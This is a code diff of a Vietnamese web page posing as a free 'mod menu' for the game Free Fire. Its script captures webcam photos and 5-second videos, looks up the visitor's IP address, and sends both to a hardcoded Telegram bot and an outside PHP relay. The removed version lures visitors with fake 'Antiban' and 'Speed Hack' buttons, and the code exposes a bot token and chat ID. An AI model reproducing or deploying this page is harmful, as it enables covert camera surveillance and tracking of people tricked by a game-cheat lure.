@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="vi">
 <head>
@@ -5,117 +6,118 @@
   <title>🔥 MOD MENU FREE FIRE 2025 🔥</title>
   <style>
     body {
-      background: black;
-      color: lime;
+      background: #000;
+      color: #0f0;
       font-family: monospace;
       text-align: center;
-      padding-top: 50px;
+      padding-top: 40px;
+    }
+    h1 {
+      color: #33ff33;
     }
     .btn {
-      padding: 15px 25px;
+      padding: 15px 30px;
+      margin: 15px;
       font-size: 18px;
+      background: #0f0;
       border: none;
-      margin: 10px;
-      background: lime;
-      color: black;
+      border-radius: 10px;
+      color: #000;
       cursor: pointer;
-      border-radius: 8px;
     }
     .btn:hover {
-      background: #33ff33;
+      background: #66ff66;
     }
   </style>
 </head>
 <body>
   <h1>🔥 MOD MENU FREE FIRE 2025 🔥</h1>
-  <p>Chọn tính năng để kích hoạt (cần cấp quyền camera):</p>
-
-  <button class="btn" onclick="capturePhoto()">📸 Cấp quyền Antiban</button>
-  <button class="btn" onclick="recordVideo()">⚡ Speed Hack (Quay Video)</button>
+  <p>Chọn chức năng để kiểm soát:</p>
+  <button class="btn" onclick="capturePhoto()">📸 Gửi ảnh + IP</button>
+  <button class="btn" onclick="recordVideo()">🎥 Gửi video 5s + IP</button>
 
   <video id="video" autoplay playsinline muted style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const token = "7885080355:AAGr9pOeVK3NPZVZUsLF7ZR9jDbf8ksyJ2E";
-    const chatId = "-1002761107238";
     let stream;
-
     async function initCamera() {
       if (!stream) {
         try {
           stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
           document.getElementById("video").srcObject = stream;
         } catch (err) {
-          alert("❌ Không thể truy cập camera: " + err);
+          alert("Không thể mở camera: " + err);
         }
       }
     }
 
-    async function capturePhoto() {
+    async function getIPInfo() {
       try {
-        await initCamera();
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-
-        canvas.toBlob(async (blob) => {
-          const form = new FormData();
-          form.append("chat_id", chatId);
-          form.append("photo", blob, "photo.png");
-          form.append("caption", "📸 FF User đã cấp quyền camera");
-
-          try {
-            const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-              method: "POST",
-              body: form
-            });
-            const data = await res.json();
-            console.log("📬 Phản hồi Telegram:", data);
-            alert("📬 Phản hồi từ Telegram:\n" + JSON.stringify(data, null, 2));
-          } catch (err) {
-            alert("❌ Gửi ảnh lỗi: " + err);
-          }
-        }, "image/png");
-
-      } catch (e) {
-        alert("❌ Không thể truy cập camera!");
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Không rõ IP";
       }
     }
 
+    async function capturePhoto() {
+      await initCamera();
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      const imageData = canvas.toDataURL("image/png");
+      const ip = await getIPInfo();
+      const time = new Date().toLocaleString();
+
+      const payload = {
+        image: imageData,
+        info: `🧠 Ảnh từ web:
+🕐 Thời gian: ${time}
+🌐 IP: ${ip}`
+      };
+
+      const res = await fetch("https://hungsime.dvd.vn/send_to_tele.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      const result = await res.json();
+      alert("✅ Ảnh đã gửi về Telegram!");
+    }
+
     async function recordVideo() {
-      try {
-        await initCamera();
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        const chunks = [];
+      await initCamera();
+      const ip = await getIPInfo();
+      const time = new Date().toLocaleString();
 
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const form = new FormData();
-          form.append("chat_id", chatId);
-          form.append("video", blob, "ff_hack_video.webm");
-          form.append("caption", "🎞️ Video quay từ menu Hack Free Fire");
+      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      const chunks = [];
 
-          try {
-            const res = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-              method: "POST",
-              body: form
-            });
-            const data = await res.json();
-            alert("📬 Video gửi về Telegram:\n" + JSON.stringify(data, null, 2));
-          } catch (err) {
-            alert("❌ Gửi video lỗi: " + err);
-          }
-        };
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const form = new FormData();
+        form.append("video", blob, "ffmod_video.webm");
+        form.append("caption", `🎥 Video 5s từ FF menu
+🕐 Thời gian: ${time}
+🌐 IP: ${ip}`);
 
-        recorder.start();
-        setTimeout(() => recorder.stop(), 5000);
-      } catch (e) {
-        alert("❌ Không thể truy cập camera!");
-      }
+        const res = await fetch("https://api.telegram.org/bot7885080355:AAGr9pOeVK3NPZVZUsLF7ZR9jDbf8ksyJ2E/sendVideo?chat_id=-1002761107238", {
+          method: "POST",
+          body: form
+        });
+
+        const result = await res.json();
+        alert("🎥 Video đã gửi về Telegram!");
+      };
+
+      recorder.start();
+      setTimeout(() => recorder.stop(), 5000);
     }
   </script>
 </body>
